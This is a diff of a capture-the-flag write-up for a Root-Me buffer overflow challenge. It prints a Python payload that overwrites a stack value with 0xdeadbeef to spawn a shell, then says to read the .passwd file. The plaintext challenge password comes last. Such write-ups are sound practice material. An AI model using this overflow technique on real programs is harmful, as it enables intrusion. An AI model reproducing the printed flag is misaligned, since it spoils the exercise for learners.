@@ -52,8 +52,10 @@ int main()
 
 ### Solution:
 - Fill the first 40 bytes of **buf** with arbitrary character, then with the satisfied value **"0xdeadbeef"**. <br>
- Command: `python -c "print('a'*40 +'\xef\xbe\xad\xde')"| ./ch13` <br>
- But as we see, it just open the shell and close it because there is no input. [Read here ?](https://www.root-me.org/?page=forum&id_thread=10116)<br>
- As suggested, the final payload: `(python -c "print('a'*40 +'\xef\xbe\xad\xde')";cat) | ./ch13 `<br>
+Command: `python -c "print('a'*40 +'\xef\xbe\xad\xde')"| ./ch13` <br>
+But as we see, it just open the shell and close it because there is no input. [Read here ?](https://www.root-me.org/?page=forum&id_thread=10116)<br>
+As suggested, the final payload: `(python -c "print('a'*40 +'\xef\xbe\xad\xde')";cat) | ./ch13 `<br>
+Then just need to read the `.passwd` file.
+
 Pass: 1w4ntm0r3pr0np1s
 
